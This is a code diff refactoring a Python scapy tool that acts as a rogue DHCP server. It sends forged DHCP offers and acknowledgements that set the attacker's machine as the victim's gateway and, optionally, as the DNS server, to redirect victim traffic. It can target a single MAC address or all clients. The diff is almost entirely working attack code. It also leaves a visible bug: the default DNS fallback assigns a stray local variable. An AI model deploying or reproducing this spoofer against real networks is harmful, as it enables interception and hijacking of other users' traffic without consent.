@@ -12,18 +12,152 @@ from sys import argv, exit
 import re
 import socket
 
-# Globals
-my_mac=None
-my_ip=None
-assign_ip=None
-target_mac=''
-dns_server=''
 
 # Constants
 
 IP_BROADCAST        = '255.255.255.255'
 DHCP_CLIENT_PORT    = 68 
 DHCP_SERVER_PORT    = 67
+
+
+class Singleton(type):
+    _instances = {}
+    def __call__(cls, *args, **kwargs):
+        if cls not in cls._instances:
+            cls._instances[cls] = super(Singleton, cls).__call__(*args, **kwargs)
+        return cls._instances[cls]
+
+
+class Spoofer(metaclass=Singleton):
+    def setup(self, my_mac, my_ip, assign_ip):
+        self.my_mac = my_mac
+        self.my_ip = my_ip
+        self.assign_ip = assign_ip
+
+        self.target_mac=''
+        self.dns_server=''
+
+    def validate(self):
+        return is_ip_valid(self.my_ip) and is_ip_valid(self.assign_ip) \
+            and is_mac_valid(self.my_mac) and (not hasattr(self, 'target_mac') or is_mac_valid(self.target_mac))\
+                and (not hasattr(self, 'dns_server') or is_ip_valid(self.dns_server))
+
+    def is_trigger(self, discover_mac):
+        return self.target_mac == '' or self.target_mac == discover_mac
+
+    
+    def build_offer_message(self, discover):
+        to_mac = discover[Ether].src
+
+        # Add Ether
+        frame = Ether(src=self.my_mac, dst=to_mac)
+
+        # Add IP with the free address
+        frame /= IP(src=self.my_ip, dst=self.assign_ip)
+
+        # Add Transportation layer
+        frame /= UDP(sport=DHCP_SERVER_PORT, dport=DHCP_CLIENT_PORT)
+
+        # Add legacy BOOTP layer
+        frame /= BOOTP()
+
+        # Change BOOTP options
+        frame[BOOTP].op = DHCP_FLAGS.BOOTREPLY
+        frame[BOOTP].htype = DHCP_FLAGS.HTYPE_DEF
+        frame[BOOTP].hlen = DHCP_FLAGS.HTYPE_LEN_DEF
+        frame[BOOTP].xid = discover[BOOTP].xid
+        frame[BOOTP].secs = 0
+        frame[BOOTP].flags = None
+        frame[BOOTP].ciaddr = '0.0.0.0'
+        frame[BOOTP].yiaddr = self.assign_ip
+        frame[BOOTP].siaddr = self.my_ip
+        frame[BOOTP].giaddr = '0.0.0.0'
+        frame[BOOTP].chaddr = mac_to_bytes(discover[Ether].src)
+
+        # Add DHCP Extension
+        frame /= DHCP()
+
+        # Change DHCP fields
+        
+        opts = [('message-type', 2),\
+                ('server_id', self.my_ip),\
+                ('lease_time', 43200),\
+                ('renewal_time', 21600),\
+                ('rebinding_time', 37800),\
+                ('subnet_mask', '255.255.255.0'),\
+                ('broadcast_address', '192.168.1.255'),\
+                ('router', self.my_ip),\
+                ('name_server', self.dns_server),\
+                ('domain', b'lan'),\
+                'end']\
+
+        # Write options
+        frame[DHCP].options = opts
+
+        return frame
+
+    
+    def build_acknowledge_message(self, request):
+        to_mac = request[Ether].src
+
+        # Add Ether
+        frame = Ether(src=self.my_mac, dst=to_mac)
+
+        # Add IP with the free address
+        frame /= IP(src=self.my_ip, dst=self.assign_ip)
+
+        # Add Transportation layer
+        frame /= UDP(sport=DHCP_SERVER_PORT, dport=DHCP_CLIENT_PORT)
+
+        # Add legacy BOOTP layer
+        frame /= BOOTP()
+
+        # Change BOOTP options
+        frame[BOOTP].op = DHCP_FLAGS.BOOTREPLY
+        frame[BOOTP].htype = DHCP_FLAGS.HTYPE_DEF
+        frame[BOOTP].hlen = DHCP_FLAGS.HTYPE_LEN_DEF
+        frame[BOOTP].xid = request[BOOTP].xid
+        frame[BOOTP].secs = 0
+        frame[BOOTP].flags = None
+        frame[BOOTP].ciaddr = '0.0.0.0'
+        frame[BOOTP].yiaddr = self.assign_ip
+        frame[BOOTP].siaddr = self.my_ip
+        frame[BOOTP].giaddr = '0.0.0.0'
+        frame[BOOTP].chaddr = mac_to_bytes(request[Ether].src)
+
+        # Add DHCP Extension
+        frame /= DHCP()
+
+        # Change DHCP fields
+        req_opts = request[DHCP].options
+        comp_name = ''
+
+        for x in req_opts:
+            if x[0].lower() == 'client_fqdn':
+                comp_name = x[1]
+                break
+        
+        if comp_name == '':
+            return None
+        
+        opts = [('message-type', 5),\
+                ('server_id', self.my_ip),\
+                ('lease_time', 43200),\
+                ('renewal_time', 21600),\
+                ('rebinding_time', 37800),\
+                ('subnet_mask', '255.255.255.0'),\
+                ('broadcast_address', '192.168.1.255'),\
+                ('router', self.my_ip),\
+                ('name_server', self.dns_server),\
+                ('domain', b'lan'),\
+                ('client_FQDN', comp_name),\
+                'end']
+
+        # Write options
+        frame[DHCP].options = opts
+
+        return frame
+
 
 
 class DHCP_FLAGS:
@@ -98,181 +232,68 @@ def print_help():
     print('')
     print('\t--dns,\t\t- redirect victim DNS queries to this machine')
 
-
-def build_offer_message(discover, my_mac, my_ip, free_ip, assign_dns):
-    to_mac = discover[Ether].src
-
-    # Add Ether
-    frame = Ether(src=my_mac, dst=to_mac)
-
-    # Add IP with the free address
-    frame /= IP(src=my_ip, dst=free_ip)
-
-    # Add Transportation layer
-    frame /= UDP(sport=DHCP_SERVER_PORT, dport=DHCP_CLIENT_PORT)
-
-    # Add legacy BOOTP layer
-    frame /= BOOTP()
-
-    # Change BOOTP options
-    frame[BOOTP].op = DHCP_FLAGS.BOOTREPLY
-    frame[BOOTP].htype = DHCP_FLAGS.HTYPE_DEF
-    frame[BOOTP].hlen = DHCP_FLAGS.HTYPE_LEN_DEF
-    frame[BOOTP].xid = discover[BOOTP].xid
-    frame[BOOTP].secs = 0
-    frame[BOOTP].flags = None
-    frame[BOOTP].ciaddr = '0.0.0.0'
-    frame[BOOTP].yiaddr = free_ip
-    frame[BOOTP].siaddr = my_ip
-    frame[BOOTP].giaddr = '0.0.0.0'
-    frame[BOOTP].chaddr = mac_to_bytes(discover[Ether].src)
-
-    # Add DHCP Extension
-    frame /= DHCP()
-
-    # Change DHCP fields
-    
-    opts = [('message-type', 2),\
-            ('server_id', my_ip),\
-            ('lease_time', 43200),\
-            ('renewal_time', 21600),\
-            ('rebinding_time', 37800),\
-            ('subnet_mask', '255.255.255.0'),\
-            ('broadcast_address', '192.168.1.255'),\
-            ('router', my_ip),\
-            ('name_server', assign_dns),\
-            ('domain', b'lan'),\
-            'end']\
-
-    # Write options
-    frame[DHCP].options = opts
-
-    return frame
-
-
-def build_acknowledge_message(request, my_mac, my_ip, assigned_ip, assign_dns):
-    to_mac = request[Ether].src
-
-    # Add Ether
-    frame = Ether(src=my_mac, dst=to_mac)
-
-    # Add IP with the free address
-    frame /= IP(src=my_ip, dst=assigned_ip)
-
-    # Add Transportation layer
-    frame /= UDP(sport=DHCP_SERVER_PORT, dport=DHCP_CLIENT_PORT)
-
-    # Add legacy BOOTP layer
-    frame /= BOOTP()
-
-    # Change BOOTP options
-    frame[BOOTP].op = DHCP_FLAGS.BOOTREPLY
-    frame[BOOTP].htype = DHCP_FLAGS.HTYPE_DEF
-    frame[BOOTP].hlen = DHCP_FLAGS.HTYPE_LEN_DEF
-    frame[BOOTP].xid = request[BOOTP].xid
-    frame[BOOTP].secs = 0
-    frame[BOOTP].flags = None
-    frame[BOOTP].ciaddr = '0.0.0.0'
-    frame[BOOTP].yiaddr = assigned_ip
-    frame[BOOTP].siaddr = my_ip
-    frame[BOOTP].giaddr = '0.0.0.0'
-    frame[BOOTP].chaddr = mac_to_bytes(request[Ether].src)
-
-    # Add DHCP Extension
-    frame /= DHCP()
-
-    # Change DHCP fields
-    req_opts = request[DHCP].options
-    comp_name = ''
-
-    for x in req_opts:
-        if x[0].lower() == 'client_fqdn':
-            comp_name = x[1]
-            break
-    
-    if comp_name == '':
-        return None
-
-    # TODO: Check if needed to tuncate non-printable charecters for comp_name
-    
-    opts = [('message-type', 5),\
-            ('server_id', my_ip),\
-            ('lease_time', 43200),\
-            ('renewal_time', 21600),\
-            ('rebinding_time', 37800),\
-            ('subnet_mask', '255.255.255.0'),\
-            ('broadcast_address', '192.168.1.255'),\
-            ('router', my_ip),\
-            ('name_server', assign_dns),\
-            ('domain', b'lan'),\
-            ('client_FQDN', comp_name),\
-            'end']
-
-    # Write options
-    frame[DHCP].options = opts
-
-    return frame
-
-
 def gen_request_filter(xid, src_mac):
     return lambda pack: pack.haslayer(BOOTP) and pack[BOOTP].xid == xid and pack.haslayer(Ether) and pack[Ether].src == src_mac
 
 
 # Prints an example discovery
 def handle_DHCP_discover(pack):
-    global my_mac, my_ip, target_mac, dns_server
+    spoof = Spoofer()
    
     print('Got Discover from ----> ', end='')
     print(pack[Ether].src)
 
-    do_packet = target_mac == '' or target_mac == pack[Ether].src
-
-    if do_packet:
+    if spoof.is_trigger(pack[Ether].src):
         print('=-=-=-=- Sending Offer =-=-=-=-')
 
-        # TODO: Check for free ip (in different function)
-
         # Send offer
-        current_offer = build_offer_message(pack, my_mac, my_ip, assign_ip, dns_server)
+        current_offer = spoof.build_offer_message(pack)
         sendp(current_offer)
 
         # Build filter func
         req_filt = gen_request_filter(pack[BOOTP].xid, pack[Ether].src)
 
         # Sniff for request
-        request = sniff(lfilter=req_filt, count=1, timeout=1)[0]
+        request = sniff(lfilter=req_filt, count=1, timeout=3)[0]
 
         # Send acknowledge
         print('=-=-=-=- Sending Acknowledge =-=-=-=-')
-        ack = build_acknowledge_message(request, my_mac, my_ip, assign_ip, dns_server)
+        ack = spoof.build_acknowledge_message(request)
         sendp(ack)
 
-        exit(0)
+        if spoof.target_mac == '':
+            exit(0)
 
 
 def main():
-    global my_mac, my_ip, assign_ip, target_mac, dns_server
-
     if len(sys.argv) < 4 or '-h' in sys.argv:
         print_help()
     else:
-        my_mac, my_ip = sys.argv[1], sys.argv[2]
+        spoof = Spoofer()
+        spoof.my_mac, spoof.my_ip = sys.argv[1], sys.argv[2]
+        spoof.assign_ip = sys.argv[3]
 
-        assign_ip = sys.argv[3]
+        if not spoof.validate():
+            print('Invalid IP or MAC')
+            exit(1)
 
         # Check for specific target
         if '-t' in argv:
             try:
-                target_mac = argv[argv.index('-t') + 1]
+                spoof.target_mac = argv[argv.index('-t') + 1]
+
+                if not spoof.validate():
+                    print('Invalid target')
+                    exit(1)
             except:
                 print('Target not specified')
                 exit(1)
 
         # Check for DNS manipulation
         if '--dns' in argv:
-            dns_server = argv[argv.index('--dns') + 1]
+            spoof.dns_server = argv[argv.index('--dns') + 1]
 
-            if not is_ip_valid(dns_server):
+            if not spoof.validate():
                 print('Not a valid DNS server')
                 exit(1)
         else:
@@ -280,10 +301,6 @@ def main():
                 dns_server = get_my_default_gateway()
             except:
                 dns_server = '8.8.8.8'
-
-        if not(is_mac_valid(my_mac) and is_ip_valid(my_ip) and is_ip_valid(assign_ip)):
-            print('Invalid IP or MAC')
-            exit(1)
 
         import_scapy()
 
